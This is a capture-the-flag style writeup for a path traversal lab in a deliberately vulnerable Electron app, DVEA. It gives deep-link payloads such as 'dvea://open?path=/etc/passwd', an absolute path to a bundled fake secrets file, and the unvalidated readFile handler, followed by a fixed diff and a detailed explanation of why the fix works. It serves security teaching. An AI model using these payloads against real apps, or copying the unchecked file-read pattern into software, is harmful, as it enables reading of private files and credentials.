# Deep Link → Path Traversal — Writeup

Module: Deep Link Hijacking
Lab page: `src/renderer/pages/deep-link-path-traversal.html`
Vulnerable code: `src/main/main.js`

---

## 1. Objective

Craft a deep link that reads a file outside the app's intended directory.

---

## 2. Exploitation walkthrough

**Step 1 — find the route.** `handleDeepLink(url)` in `src/main/main.js` has a second
branch, gated on `parsed.host === 'open'`, that reads a `path` query parameter and hands it
straight to `fs.promises.readFile()` — no allowlist, no canonicalization, no check that the
path stays anywhere near the app's own files:

```js
// Route: open/read a file (dvea://open?path=...)
const openPath = parsed.searchParams.get('path');
if (parsed.host === 'open' && openPath && mainWindow) {
  try {
    await mainWindow.loadFile(path.join('src/renderer/pages', 'deep-link-path-traversal.html'));
    try {
      const content = await fs.promises.readFile(openPath, 'utf8');
      mainWindow.webContents.send('deeplink-open', { path: openPath, content });
    } catch (err) {
      mainWindow.webContents.send('deeplink-open', { path: openPath, error: 'Read failed: ' + err.message });
    }
  } catch (err) {
    console.error('Failed to load route2 page for deep link open:', err);
  }
  return;
}
```

`new URL('dvea://open?path=/etc/passwd')` parses with `host === 'open'` and
`searchParams.get('path') === '/etc/passwd'` — confirmed directly against Node's URL
parser — so the real attack primitive is:

```
dvea://open?path=<attacker-controlled file path>
```

**Step 2 — build the payload.** Because `openPath` is passed to `readFile()` completely
unvalidated, both an absolute path and a relative traversal sequence work:

```
dvea://open?path=/etc/passwd
```

Clicking this on a packaged install drives the trusted window to this lab's page and
displays the contents of `/etc/passwd` — a file with no relationship whatsoever to DVEA's
own directory — proving arbitrary file read.

**Step 3 — reproduce locally without OS scheme registration.** As with the Untrusted
Navigation lab, running from source doesn't reliably register `dvea://` with the OS. The
"Simulate Deep Link" button exercises the identical unvalidated read via the
`simulate-deeplink-open` IPC handler:

```js
// src/main/main.js
ipcMain.handle('simulate-deeplink-open', async (event, requestedPath) => {
  try {
    const p = requestedPath;
    const content = await fs.promises.readFile(p, 'utf8');
    return { content };
  } catch (err) {
    return { error: 'Read failed: ' + err.message };
  }
});
```

Type `/etc/passwd` into the lab's path field and click **Simulate Deep Link** — the result
panel shows the raw file contents, fetched by the main process with the app's own
filesystem permissions.

**Step 4 — confirm against a bundled target.** DVEA ships a fake secrets file at
`src/renderer/pages/secret.txt` — a synthetic `secrets.env`-style dump (fake DB connection
string, AWS keys, Stripe key, JWT signing secret) carrying the flag
`DVEA{arbitrary_file_read_via_deep_link}`. It's shaped to look like the kind of credentials
file an attacker would hope to exfiltrate, so the impact of arbitrary file read is obvious,
while every value in it is clearly synthetic. The read
handler passes your path straight to `fs.promises.readFile(openPath)`, and Node resolves a
*relative* path against `process.cwd()` — so the exact string you supply depends on how DVEA
is running.

*Case A — running from source (`npm start`).* `process.cwd()` is the repo root, so the
relative path resolves directly:

```
src/renderer/pages/secret.txt
```

Type that into the lab's path field and **Simulate Deep Link**, or fire the real handler
with `./node_modules/.bin/electron . 'dvea://open?path=src/renderer/pages/secret.txt'`
(same argv/second-instance dispatch as the Untrusted Navigation lab — see that writeup's
Step 3). The result panel shows the fake secrets file, including
`DVEA_FLAG=DVEA{arbitrary_file_read_via_deep_link}`.

*Case B — running from an installed `.deb`.* The relative path from Case A **will not work**:
when DVEA is launched from a desktop menu or `xdg-open`, `process.cwd()` is typically `/` or
the user's home directory, not the app's resources dir — so `src/renderer/pages/secret.txt`
resolves to a nonexistent path and the read fails. Supply the **absolute** path instead. The
packaged app installs as loose files (no `asar` — see the Untrusted Navigation writeup), so
`secret.txt` sits on the real filesystem under the maker-deb prefix:

```
dvea://open?path=/usr/lib/dvea/resources/app/src/renderer/pages/secret.txt
```

On an installed build the OS has registered `dvea://`, so that link dispatched from a
browser, email, or `xdg-open` reaches the app and the result panel shows the flag.
`/usr/lib/dvea/` is the default install prefix; if a repackage or distro places it elsewhere
(e.g. `/opt/dvea/`), resolve the real path on the target with
`dpkg -L dvea | grep secret.txt`. (Unlike the fake-login `file://` case, this read goes
through Node `fs`, not Chromium's `file://` handler — so even if DVEA *were* built with asar,
`fs.readFile('.../app.asar/src/renderer/pages/secret.txt')` would still succeed, because
Electron patches Node's `fs` to read transparently inside an asar archive. Packaging choice
doesn't rescue this one.)

Either way, `secret.txt` is just a convenient, permission-independent demo target that lives
under the app's own pages directory. Supplying `/etc/passwd` or any other absolute path
proves the read is not confined to that directory — or to the app — at all, in both source
and packaged builds.

---

## 3. Vulnerable code vs. fixed code

**Vulnerable** (`src/main/main.js`, inside `handleDeepLink`):

```js
const openPath = parsed.searchParams.get('path');
if (parsed.host === 'open' && openPath && mainWindow) {
  try {
    await mainWindow.loadFile(path.join('src/renderer/pages', 'deep-link-path-traversal.html'));
    try {
      const content = await fs.promises.readFile(openPath, 'utf8');
      mainWindow.webContents.send('deeplink-open', { path: openPath, content });
    } catch (err) {
      mainWindow.webContents.send('deeplink-open', { path: openPath, error: 'Read failed: ' + err.message });
    }
  } catch (err) {
    console.error('Failed to load route2 page for deep link open:', err);
  }
  return;
}
```

**Fixed** — canonicalize the requested path and confirm it stays inside an intended base
directory before reading it:

```diff
+const ALLOWED_BASE_DIR = path.resolve(__dirname, '../renderer/pages');
+
 const openPath = parsed.searchParams.get('path');
 if (parsed.host === 'open' && openPath && mainWindow) {
   try {
     await mainWindow.loadFile(path.join('src/renderer/pages', 'deep-link-path-traversal.html'));
     try {
-      const content = await fs.promises.readFile(openPath, 'utf8');
+      const resolvedPath = path.resolve(ALLOWED_BASE_DIR, openPath);
+      const relativeToBase = path.relative(ALLOWED_BASE_DIR, resolvedPath);
+      const isConfined =
+        relativeToBase !== '' &&
+        !relativeToBase.startsWith('..') &&
+        !path.isAbsolute(relativeToBase);
+      if (!isConfined) {
+        throw new Error('Requested path escapes the allowed directory');
+      }
+      const content = await fs.promises.readFile(resolvedPath, 'utf8');
       mainWindow.webContents.send('deeplink-open', { path: openPath, content });
     } catch (err) {
       mainWindow.webContents.send('deeplink-open', { path: openPath, error: 'Read failed: ' + err.message });
     }
   } catch (err) {
     console.error('Failed to load route2 page for deep link open:', err);
   }
   return;
 }
```

The same confinement check belongs in `simulate-deeplink-open`, which performs the
identical unchecked `readFile(requestedPath)`.

---

## 4. Why the fix works

- **`path.resolve(ALLOWED_BASE_DIR, openPath)` collapses the path before any decision is
  made.** `path.resolve` processes segments right-to-left and folds out any `..`/`.`
  components, producing one final absolute path. This defeats relative traversal payloads
  like `../../../../etc/passwd` — verified directly: `path.resolve(ALLOWED_BASE_DIR,
  '../../../../etc/passwd')` collapses to an absolute path outside the base, which the next
  check catches.
- **It also defeats the absolute-path bypass, which is the more realistic attack here.**
  Node's `path.resolve(base, target)` has a specific, easy-to-miss behavior: *if `target` is
  already absolute, `base` is discarded entirely* — `path.resolve('/allowed/dir',
  '/etc/passwd')` simply returns `/etc/passwd`. A confinement check that only strips `../`
  sequences from the input (a common but incomplete fix) would miss this completely, because
  the attacker never needs `../` at all — supplying `/etc/passwd` directly is enough, and
  that's exactly the shape of the working payload in this lab. Catching this requires
  checking the *final resolved path*, not the input string.
- **`path.relative(ALLOWED_BASE_DIR, resolvedPath)` is what actually catches both cases.**
  If the resolved path is inside the base directory, the relative path between them never
  starts with `..` and is never itself absolute. If it climbed outside (via `../` segments
  or because it was absolute all along), the relative path is forced to start with one or
  more `..` segments to express "go back up and over" — verified directly for both
  `/etc/passwd` and `../../../../etc/passwd` against this exact check. That's the concrete
  signal the fix rejects on.
- **Compare resolved paths, not string prefixes.** A naive check like
  `openPath.startsWith(ALLOWED_BASE_DIR)` is also bypassable by a sibling directory sharing
  the same prefix (e.g. an allowed dir `/app/pages` vs. an attacker-supplied
  `/app/pages-evil/secret`, which passes a plain `startsWith` check while pointing somewhere
  else). Resolving first and comparing via `path.relative` avoids this class of bug entirely
  because it reasons about actual path structure, not raw string matching.
- **Fail closed.** Anything that isn't confined throws, and the existing error path already
  sends `{ path, error }` back to the renderer — no behavior change on the happy path, and
  no partial read ever happens for a rejected request.
